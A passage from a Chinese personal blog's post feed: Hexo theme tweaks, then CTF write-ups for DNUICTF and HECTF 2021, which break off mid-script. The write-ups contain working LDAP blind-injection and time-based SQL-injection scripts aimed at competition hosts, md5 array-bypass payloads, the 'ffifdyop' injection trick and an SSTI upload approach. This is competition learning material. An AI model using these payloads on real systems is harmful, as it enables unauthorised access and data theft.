--save</span><br></pre></td></tr></table></figure><p>然后在主配置文件<code>_config.yml</code>中加入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="文章置顶和隐藏-2-0升级版"><a href="#文章置顶和隐藏-2-0升级版" class="headerlink" title="文章置顶和隐藏(2.0升级版)"></a>文章置顶和隐藏(2.0升级版)</h1><h2 id="文章隐藏"><a href="#文章隐藏" class="headerlink" title="文章隐藏"></a>文章隐藏</h2><p>hexo默认是会把所有文章按照时间顺序排列，分页展示。百度上查到一个黑科技，直接改模板引擎，增加一个显示隐藏的标记位，渲染的时候判断，如果为hide就隐藏。这种方式有一个bug：文章是隐藏了，但是分页计数仍然计算。假设首页十篇文章都设置隐藏，那首页就是空白的一页，而不会显示第二页的文章。这怎么能忍，果断放弃。后来又在<a href="https://hexo.io/plugins/">Hexo插件库</a>找到一个产生首页的插件，自带过滤功能，<a href="https://github.com/Jamling/hexo-generator-index2">hexo-generator-index2</a>。</p><p>首先我们替换插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-generator-index –save</span><br><span class="line">npm install hexo-generator-index2 –save</span><br></pre></td></tr></table></figure><p>然后在主配置文件<code>_config</code>添加</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">index2_include_index:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">index2_generator:</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span> <span class="comment"># 按发布时间排序</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tag</span> <span class="string">漫画</span> <span class="comment"># 不包含标签为hide的文章</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">category</span> <span class="string">漫画</span> <span class="comment"># 不包含分类为hide的文章</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="string">&#x27;index&#x27;</span> <span class="comment"># use existing index layout</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># output to root directory: http://127.0.0.1:4000/</span></span><br><span class="line">  <span class="attr">index:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="文章置顶-1"><a href="#文章置顶-1" class="headerlink" title="文章置顶"></a>文章置顶</h2><p>完成刚才的那些操作只能完成文章的隐藏，还没有办法置顶，虽然插件<code>hexo-generator-index-pin-top</code>可以实现功能，但是两个插件只能留一个，所以不能更换</p><p>所以我们来修改<code>hexo-generator-index2</code>的代码</p><p>找到<code>node_modules/hexo-generator-index2/lib/generator2.js</code>并打开</p><p>找到<code> var posts = locals.posts.sort(generator.order_by);</code>在下方添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123; <span class="comment">// 两篇文章top都有定义</span></span><br><span class="line">        <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date; <span class="comment">// 若top值一样则按照文章日期降序排</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top; <span class="comment">// 否则按照top值降序排</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123; <span class="comment">// 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233）</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date; <span class="comment">// 都没定义按照文章日期降序排</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="页脚跳动的心"><a href="#页脚跳动的心" class="headerlink" title="页脚跳动的心"></a>页脚跳动的心</h1><h2 id="效果展示：-7"><a href="#效果展示：-7" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112131227979.png" alt="image-20211213121524576"></p><h2 id="配置方法：-7"><a href="#配置方法：-7" class="headerlink" title="配置方法："></a>配置方法：</h2><p>修改<code>/themes/butterfly/layout/includes/footer.pug</code>文件，修改如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.copyright!= <span class="string">`&amp;copy;<span class="subst">$&#123;theme.footer.owner.since&#125;</span> - <span class="subst">$&#123;nowYear&#125;</span> By <span class="subst">$&#123;config.author&#125;</span>`</span></span><br><span class="line">==&gt;</span><br><span class="line">.copyright!= <span class="string">`&amp;copy;<span class="subst">$&#123;theme.footer.owner.since&#125;</span> - <span class="subst">$&#123;nowYear + <span class="string">&#x27; &#x27;</span>&#125;</span> &lt;i id=&quot;heartbeat&quot; class=&quot;fa fas fa-heartbeat&quot;&gt;&lt;/i&gt; <span class="subst">$&#123;config.author&#125;</span>`</span></span><br><span class="line"></span><br><span class="line">.copyright!= <span class="string">`&amp;copy;<span class="subst">$&#123;nowYear&#125;</span> By <span class="subst">$&#123;config.author&#125;</span>`</span></span><br><span class="line">==&gt;</span><br><span class="line">.copyright!= <span class="string">`&amp;copy;<span class="subst">$&#123;nowYear + <span class="string">&#x27; &#x27;</span>&#125;</span> &lt;i id=&quot;heartbeat&quot; class=&quot;fa fas fa-heartbeat&quot;&gt;&lt;/i&gt; <span class="subst">$&#123;config.author&#125;</span>`</span></span><br></pre></td></tr></table></figure><p>并将如下代码加到最后</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结构如下图：</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112131228876.png" alt="image-20211213121735646"></p><h1 id="hexo-magnet-插件-1-0"><a href="#hexo-magnet-插件-1-0" class="headerlink" title="hexo-magnet 插件 1.0"></a>hexo-magnet 插件 1.0</h1><h2 id="效果展示：-8"><a href="#效果展示：-8" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112131230098.png" alt="image-20211213122854902"></p><h2 id="配置方法：-8"><a href="#配置方法：-8" class="headerlink" title="配置方法："></a>配置方法：</h2><p>安装插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-magnet --save</span><br></pre></td></tr></table></figure><p>在主配置文件<code>_config</code>中添加</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># magnet</span></span><br><span class="line"><span class="attr">magnet:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">categories</span></span><br><span class="line">  <span class="attr">devide:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">刷题记录</span></span><br><span class="line">      <span class="attr">display_name:</span> <span class="string">小🐷の刷题历程</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">📚</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">比赛记录</span></span><br><span class="line">      <span class="attr">display_name:</span> <span class="string">小🐷の比赛之路</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">🎮</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">学习笔记</span></span><br><span class="line">      <span class="attr">display_name:</span> <span class="string">小🐷の学习笔记</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">📒</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">漏洞复现</span></span><br><span class="line">      <span class="attr">display_name:</span> <span class="string">小🐷の漏洞复现</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">💡</span></span><br><span class="line">    <span class="comment"># - name: 学习</span></span><br><span class="line">    <span class="comment">#   display_name: 小🐷の刷题历程</span></span><br><span class="line">    <span class="comment">#   icon: 🐱‍👓</span></span><br><span class="line">    <span class="comment"># - name: 随想</span></span><br><span class="line">    <span class="comment">#   display_name: 小冰の胡思乱想</span></span><br><span class="line">    <span class="comment">#   icon: 👩‍💻</span></span><br><span class="line">  <span class="attr">color_setting:</span></span><br><span class="line">    <span class="attr">text_color:</span> <span class="string">black</span></span><br><span class="line">    <span class="attr">text_hover_color:</span> <span class="string">white</span></span><br><span class="line">    <span class="attr">background_color:</span> <span class="string">&quot;#ecf5ffc0&quot;</span></span><br><span class="line">    <span class="attr">background_hover_color:</span> <span class="string">&quot;#49b1ffc0&quot;</span></span><br><span class="line">  <span class="attr">layout:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">temple_html:</span> <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height: auto&quot;&gt;&lt;div id=&quot;catalog_magnet&quot;&gt;$&#123;temple_html_item&#125;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  <span class="attr">plus_style:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>更多主题配置请前往：<a href="https://github.com/Zfour/hexo-magnet/issues">https://github.com/Zfour/hexo-magnet/issues</a></p><p>但是出现了这样的问题</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112131240714.png" alt="img"></p><p>在群里问了一下师傅们，在外挂css中加入如下代码就好了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 优化magnet插件卡片不对齐问题 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.magnet_item</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0px</span> <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#catalog_magnet</span> &#123;</span><br><span class="line">    <span class="attribute">justify-content</span>: center <span class="meta">!important</span>;</span><br><span class="line">    <span class="comment">/*原本为space-between*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> DIY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNUICTF</title>
      <link href="/post/2021-12/DNUICTF/"/>
      <url>/post/2021-12/DNUICTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到-flag"><a href="#签到-flag" class="headerlink" title="[签到] flag"></a>[签到] flag</h2><p>等一会后把内容复制下来，然后执行一下脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">content = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    match = re.search(<span class="string">r&#x27;第&#123;&#125;位是[A-Za-z\u4e00-\u9fa50-9]&#x27;</span>.<span class="built_in">format</span>(i), content)</span><br><span class="line">    flag += <span class="built_in">str</span>(match.group(<span class="number">0</span>)[-<span class="number">1</span>]).replace(<span class="string">&#x27;叉&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>flag{nss_login}</p><h2 id="萌-odd-upload"><a href="#萌-odd-upload" class="headerlink" title="[萌]odd_upload"></a>[萌]odd_upload</h2><p>在github上随便下了一个Smarty引擎模板，看了一下目录结构</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|demo</span><br><span class="line">-|cache</span><br><span class="line">-|configs</span><br><span class="line">-|plugins</span><br><span class="line">-|templates</span><br><span class="line">-footer.tpl</span><br><span class="line">-header.tpl</span><br><span class="line">-index.tpl</span><br><span class="line">-|templates_c</span><br><span class="line">-index.php</span><br><span class="line">|lexer</span><br><span class="line">|libs</span><br></pre></td></tr></table></figure><p>有个文件上传，因为是模板引擎所以想到SSTI，然后进行文件覆盖实现模板注入</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020091.png" alt="image-20211204144717432"></p><p>刷新页面就得到了flag</p><p>flag{14863dfb-5890-41db-a9b4-ce390f19ca9a}</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020092.png" alt="image-20211204144833667"></p><h2 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h2><p>F12看到源码里有隐藏的账号和密码获得提示：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0<span class="number">-9</span>_</span><br></pre></td></tr></table></figure><p>学了会LADP的基础语法编写盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333&#x27;</span></span><br><span class="line"></span><br><span class="line">flag, done = <span class="string">&#x27;LDAP&#x27;</span>, <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        payload = flag + <span class="built_in">chr</span>(j) + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;user&#x27;</span>: payload, <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;查询用户不唯一&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag.lower() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag{<a href="mailto:&#108;&#x64;&#x61;&#x70;&#108;&#x69;&#95;&#x31;&#x73;&#95;&#x76;&#x33;&#x72;&#121;&#95;&#101;&#x7a;&#64;&#x6e;&#x73;&#x73;&#46;&#109;&#111;&#x65;">&#108;&#x64;&#x61;&#x70;&#108;&#x69;&#95;&#x31;&#x73;&#95;&#x76;&#x33;&#x72;&#121;&#95;&#101;&#x7a;&#64;&#x6e;&#x73;&#x73;&#46;&#109;&#111;&#x65;</a>}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="萌新-在哪呢"><a href="#萌新-在哪呢" class="headerlink" title="[萌新]在哪呢"></a>[萌新]在哪呢</h2><p>pdf直接Ctrl+F搜flag:flag{hey_there_is_no_thing}</p><h2 id="签到-签到"><a href="#签到-签到" class="headerlink" title="[签到]签到"></a>[签到]签到</h2><p>flag{Dnui_ctf_2021_s1gn_in}</p><h2 id="只是个PNG，别想太多了-png"><a href="#只是个PNG，别想太多了-png" class="headerlink" title="只是个PNG，别想太多了.png"></a>只是个PNG，别想太多了.png</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e PNG.png</span><br></pre></td></tr></table></figure><p>查看880ED就可得到flag</p><p>flag{zhe_ti_mu_ye_tai_bt_le_XD}</p><h2 id="压缩包压缩包压缩包压缩包"><a href="#压缩包压缩包压缩包压缩包" class="headerlink" title="压缩包压缩包压缩包压缩包"></a>压缩包压缩包压缩包压缩包</h2><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&quot;./yasuobao&quot;</span>)</span><br><span class="line">zip_file = zipfile.ZipFile(<span class="string">&#x27;./yasuobao.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">zip_list = zip_file.namelist()</span><br><span class="line"><span class="keyword">while</span> zip_list[<span class="number">0</span>][-<span class="number">3</span>:] == <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">    zip_file.extract(zip_list[<span class="number">0</span>],</span><br><span class="line">                     pwd=zip_list[<span class="number">0</span>][:-<span class="number">4</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                     path=<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">    delete_file = zip_list[<span class="number">0</span>]</span><br><span class="line">    zip_file = zipfile.ZipFile(<span class="string">&#x27;./&#x27;</span> + zip_list[<span class="number">0</span>][:-<span class="number">4</span>] + <span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">    zip_list = zip_file.namelist()</span><br><span class="line"><span class="built_in">print</span>(zip_list[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>然后再用ARCHPR暴力破解6位数字密码</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020094.png" alt="image-20211205160427358"></p><p>解压出来的文件直接Ctrl+F搜索flag就可获得flag</p><p>flag{Unz1p_i5_So_C00l}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="萌新-素数"><a href="#萌新-素数" class="headerlink" title="[萌新]素数"></a>[萌新]素数</h2><p>直接上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">n_length = <span class="number">1025</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    primeNum = number.getPrime(n_length)</span><br><span class="line">    data = &#123;<span class="string">&quot;number&quot;</span>: primeNum&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{d6a6a1bc-88e9-4330-83f9-bdd3bdad5401}</p><h2 id="签到-键盘侠"><a href="#签到-键盘侠" class="headerlink" title="[签到]键盘侠"></a>[签到]键盘侠</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020093.png" alt="image-20211204200808253"></p><p>flag{clckouthv}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HECTF 2021</title>
      <link href="/post/2021-11/HECTF2021/"/>
      <url>/post/2021-11/HECTF2021/</url>
      
        <content type="html"><![CDATA[<p>wow，第一次AK web题，这感觉太爽了！！！</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="mmmmd5d5d5d5"><a href="#mmmmd5d5d5d5" class="headerlink" title="mmmmd5d5d5d5"></a>mmmmd5d5d5d5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure><p>数组绕过：</p><blockquote><p>payload:a[]=1&amp;b[]=2</p></blockquote><p>第二关，md5碰撞脚本，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>, <span class="number">9999999</span>):</span><br><span class="line">    encode = md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> encode[<span class="number">5</span>:<span class="number">10</span>] == <span class="string">&#x27;a698f&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>第三关：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p><code>ffifdyop</code>的md5加密值为<code>276f722736c95d99e921722cf9ed621c</code>转成字符串为<code>&#39;or&#39;6�]��!r,��b</code>从而完成了注入</p><p>第四关，依然用数组绕过</p><blockquote><p>payload:param1[]=1&amp;param2[]=2</p></blockquote><h2 id="EDFnb"><a href="#EDFnb" class="headerlink" title="EDFnb"></a>EDFnb</h2><p>直接在远程仓库找</p><h3 id="时光塔的宝藏"><a href="#时光塔的宝藏" class="headerlink" title="时光塔的宝藏"></a>时光塔的宝藏</h3><p>时间盲注exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://81.70.102.209:10020/&quot;</span>  <span class="comment"># 注入位置</span></span><br><span class="line">payload = <span class="string">&quot;select load_file(&#x27;/flag&#x27;)&quot;</span>   <span class="comment"># 需要查询的内容</span></span><br><span class="line"><span class="comment"># select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;users&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lensqlblind</span>():</span></span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    end = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;usname&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pswd&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;/**/or/**/if(length((<span class="subst">&#123;payload&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.3),0)/**/#&#x27;&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        r.encoding = 